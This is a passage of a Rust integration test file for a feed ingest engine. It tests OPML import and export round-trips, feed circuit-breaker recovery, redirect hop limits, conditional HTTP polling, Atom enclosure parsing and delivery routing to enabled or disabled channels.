    // Manual / MCP `reset_circuit = true` recovers the feed back to `Active`!
    let recovered = engine
        .poll_feed(feed_flaky.id, true, false)
        .await
        .expect("reset_circuit poll should recover");
    assert_eq!(recovered.feed.health_status, FeedHealthStatus::Active);
    assert_eq!(recovered.feed.consecutive_failures, 0);
    assert!(recovered.feed.last_error.is_none());
    assert_eq!(recovered.feed.title, "Recovered Feed");
}

// ============================================================================
// 4. Nested OPML 2.0 Import (Folder -> Tags) & Lossless Export Round-Trip
// ============================================================================

#[tokio::test]
async fn opml_nested_import_dedup_and_export_round_trip() {
    let (_tmp, db) = open_test_db().await;
    let engine = IngestEngine::new(db.clone(), ProtectedHttpClient::with_defaults());

    let sample_opml = r#"<?xml version="1.0" encoding="UTF-8"?>
    <opml version="2.0">
      <head>
        <title>Ellery Subscriptions</title>
      </head>
      <body>
        <outline text="Tech" title="Tech">
          <outline text="Rust">
            <outline type="rss" text="Rust Blog" title="Rust Blog" xmlUrl="https://blog.rust-lang.org/feed.xml" htmlUrl="https://blog.rust-lang.org/" />
          </outline>
          <outline type="rss" text="LWN.net" xmlUrl="https://lwn.net/headlines/rss" htmlUrl="https://lwn.net/" />
        </outline>
        <outline text="Favorites">
          <!-- Duplicate xmlUrl under a second folder should merge tags rather than duplicate DB row -->
          <outline type="rss" text="Rust Blog" xmlUrl="https://blog.rust-lang.org/feed.xml" />
        </outline>
        <outline type="rss" text="Root Untagged Blog" title="Root Untagged Blog" xmlUrl="https://example.org/atom.xml" htmlUrl="https://example.org/" />
      </body>
    </opml>"#;

    let first_import = engine
        .import_opml(sample_opml, true)
        .await
        .expect("import nested OPML");
    assert_eq!(first_import.imported_count, 3);
    assert_eq!(first_import.skipped_existing_count, 0);

    let rust_feed = db
        .get_feed_by_url("https://blog.rust-lang.org/feed.xml")
        .await
        .unwrap()
        .expect("Rust Blog imported");
    assert_eq!(rust_feed.title, "Rust Blog");
    assert_eq!(
        rust_feed.site_url.as_deref(),
        Some("https://blog.rust-lang.org/")
    );
    assert_eq!(
        rust_feed.tags(),
        vec![
            "Tech".to_string(),
            "Rust".to_string(),
            "Favorites".to_string()
        ]
    );
    assert!(rust_feed.silent_init);

    let lwn_feed = db
        .get_feed_by_url("https://lwn.net/headlines/rss")
        .await
        .unwrap()
        .expect("LWN imported");
    assert_eq!(lwn_feed.tags(), vec!["Tech".to_string()]);

    let root_feed = db
        .get_feed_by_url("https://example.org/atom.xml")
        .await
        .unwrap()
        .expect("Root untagged feed imported");
    assert!(root_feed.tags().is_empty());

    // Re-importing the exact same OPML skips all 3 existing feeds cleanly.
    let second_import = engine
        .import_opml(sample_opml, true)
        .await
        .expect("re-import OPML");
    assert_eq!(second_import.imported_count, 0);
    assert_eq!(second_import.skipped_existing_count, 3);

    // Export back to OPML 2.0 XML and verify lossless round-trip via `parse_opml`.
    let exported_xml = engine.export_opml().await.expect("export OPML 2.0");
    assert!(exported_xml.contains("<opml version=\"2.0\">"));
    assert!(exported_xml.contains("text=\"Tech\""));

    let reparsed = parse_opml(&exported_xml).expect("re-parse exported OPML");
    assert_eq!(reparsed.len(), 3);

    let reparsed_rust = reparsed
        .iter()
        .find(|o| o.xml_url == "https://blog.rust-lang.org/feed.xml")
        .expect("Rust Blog in exported OPML");
    assert_eq!(reparsed_rust.title, "Rust Blog");
    assert_eq!(
        reparsed_rust.html_url.as_deref(),
        Some("https://blog.rust-lang.org/")
    );
    assert_eq!(
        reparsed_rust.tags,
        vec![
            "Tech".to_string(),
            "Rust".to_string(),
            "Favorites".to_string()
        ]
    );

    let reparsed_root = reparsed
        .iter()
        .find(|o| o.xml_url == "https://example.org/atom.xml")
        .expect("Root feed in exported OPML");
    assert!(reparsed_root.tags.is_empty());
}

#[tokio::test]
async fn redirect_hop_limit_and_conditional_last_modified_and_atom_json_feed() {
    let (_tmp, db) = open_test_db().await;
    let server = MockServer::start().await;
    let http = loopback_allowlisted_client();
    let engine = IngestEngine::new(db.clone(), http.clone());

    // 1. Redirect loop (> 5 hops) aborts cleanly with `AppError::Upstream`.
    Mock::given(method("GET"))
        .and(path("/loop"))
        .respond_with(ResponseTemplate::new(302).insert_header("Location", "/loop"))
        .mount(&server)
        .await;

    let loop_err = http
        .get_bytes(OutboundRequest::new(format!("{}/loop", server.uri())))
        .await
        .expect_err("redirect loop exceeding 5 hops must fail");
    assert!(
        matches!(&loop_err, AppError::Upstream(msg) if msg.contains("maximum redirect hops")),
        "unexpected error for redirect loop: {loop_err:?}"
    );

    // 2. Atom 1.0 feed with `<icon>`, `<link rel="enclosure">`, `If-Modified-Since`, catch-all route,
    // and disabled-channel route (which must be skipped!).
    let enabled_ch = db
        .create_channel(&NewChannel {
            name: "Enabled SMTP".to_string(),
            kind: ChannelKind::Smtp,
            encrypted_config: vec![9, 9],
            credential_group_key: "smtp_1".to_string(),
            capabilities_json: "{}".to_string(),
            min_interval_secs: 10,
            jitter_max_secs: 0,
            hourly_quota: None,
            daily_quota: None,
            use_proxy: false,
            enabled: true,
        })
        .await
        .unwrap();

    let disabled_ch = db
        .create_channel(&NewChannel {
            name: "Disabled Channel".to_string(),
            kind: ChannelKind::Smtp,
            encrypted_config: vec![8, 8],
            credential_group_key: "smtp_2".to_string(),
            capabilities_json: "{}".to_string(),
            min_interval_secs: 10,
            jitter_max_secs: 0,
            hourly_quota: None,
            daily_quota: None,
            use_proxy: false,
            enabled: false,
        })
        .await
        .unwrap();

    // Catch-all route (`feed_ids = []` and `match_tags = []` -> matches ALL feeds).
    let catch_all_route = db
        .create_route(&NewRoute {
            name: "Catch-All Enabled".to_string(),
            feed_ids: vec![],
            match_tags: vec![],
            channel_id: enabled_ch.id,
            include_keywords: vec![],
            exclude_keywords: vec![],
            include_regex: None,
            exclude_regex: None,
            options: RouteOptions::default(),
            enabled: true,
        })
        .await
        .unwrap();

    // Enabled route pointing to a DISABLED channel -> must NOT enqueue tasks!
    let _disabled_ch_route = db
        .create_route(&NewRoute {
            name: "Route on Disabled Channel".to_string(),
            feed_ids: vec![],
            match_tags: vec![],
            channel_id: disabled_ch.id,
            include_keywords: vec![],
            exclude_keywords: vec![],
            include_regex: None,
            exclude_regex: None,
            options: RouteOptions::default(),
            enabled: true,
        })
        .await
        .unwrap();

    let atom_xml = format!(
        r#"<?xml version="1.0" encoding="utf-8"?>
        <feed xmlns="http://www.w3.org/2005/Atom">
          <title>Podcast &amp; Atom Notes</title>
          <id>urn:uuid:atom-feed-1</id>
          <updated>2026-11-13T10:00:00Z</updated>
          <icon>/static/icon.png</icon>
          <link rel="alternate" href="{base}/site/" />
          <entry>
            <id>urn:uuid:atom-entry-1</id>
            <title>Episode 1: Async SQLite</title>
            <updated>2026-11-13T10:00:00Z</updated>
            <author><name>Alice</name></author>
            <link rel="alternate" href="/episodes/1?gclid=abc123" />
            <link rel="enclosure" href="/audio/ep1.mp3" type="audio/mpeg" length="123456" />
            <content type="html"><![CDATA[<p>Listen now。第二句内容。</p><img src="/episodes/cover1.jpg">]]></content>
          </entry>
        </feed>"#,
        base = server.uri()
    );

    let last_mod = "Fri, 13 Nov 2026 10:00:00 GMT";
    Mock::given(method("GET"))
        .and(path("/atom.xml"))
        .and(header_exists("If-Modified-Since"))
        .respond_with(ResponseTemplate::new(304))
        .up_to_n_times(1)
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/atom.xml"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("Content-Type", "application/atom+xml")
                .insert_header("Last-Modified", last_mod)
                .set_body_string(atom_xml),
        )
        .up_to_n_times(1)
        .mount(&server)
        .await;

    let mut new_atom = NewFeed::new(format!("{}/atom.xml", server.uri()));
    new_atom.silent_init = false;
    let atom_feed = db.create_feed(&new_atom).await.unwrap();

    let poll_1 = engine.poll_feed(atom_feed.id, false, false).await.unwrap();
    assert_eq!(poll_1.feed.last_modified.as_deref(), Some(last_mod));
    assert_eq!(poll_1.new_entries, 1);
    assert_eq!(
        poll_1.enqueued_tasks, 1,
        "catch-all route must match while route on disabled channel is skipped"
    );
    assert_eq!(
        poll_1.feed.favicon_url.as_deref(),
        Some(format!("{}/static/icon.png", server.uri()).as_str())
    );

    let entries = db.list_entries_for_feed(atom_feed.id, 10).await.unwrap();
    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].author.as_deref(), Some("Alice"));
    assert_eq!(entries[0].first_sentence.as_deref(), Some("Listen now"));
    assert_eq!(
        entries[0].canonical_url.as_deref(),
        Some(format!("{}/episodes/1", server.uri()).as_str())
    );
    let media = entries[0].media();
    assert_eq!(media.len(), 2, "expected enclosure mp3 + inline cover jpg");
    assert_eq!(media[0].url, format!("{}/audio/ep1.mp3", server.uri()));
    assert_eq!(media[0].length_bytes, Some(123_456));
    assert_eq!(
        media[1].url,
        format!("{}/episodes/cover1.jpg", server.uri())
    );

    let claimed = db
        .claim_next_delivery_task(now_unix() + 10, 60)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(claimed.route_id, catch_all_route.id);

    // Second poll sends `If-Modified-Since` and receives `304 Not Modified`.
    let poll_2 = engine.poll_feed(atom_feed.id, false, false).await.unwrap();
    assert!(poll_2.not_modified);
    let recorded = server.received_requests().await.unwrap();
    let atom_poll_2_req = recorded
        .iter()
        .rev()
        .find(|r| r.url.path() == "/atom.xml")
        .expect("recorded second /atom.xml request");
    let ims_val = atom_poll_2_req
        .headers
        .get("if-modified-since")
        .and_then(|v| v.to_str().ok());
    assert_eq!(ims_val, Some(last_mod));

    // 3. Invalid regex in ContentFilterRules returns `AppError::Validation`.
    let bad_filter = ContentFilterRules {
        include_keywords: vec![],
        exclude_keywords: vec![],
        include_regex: Some("([unclosed".to_string()),
        exclude_regex: None,
    };
    let err = bad_filter.compile().expect_err("invalid regex must fail");
    assert!(matches!(err, AppError::Validation(_)));
}
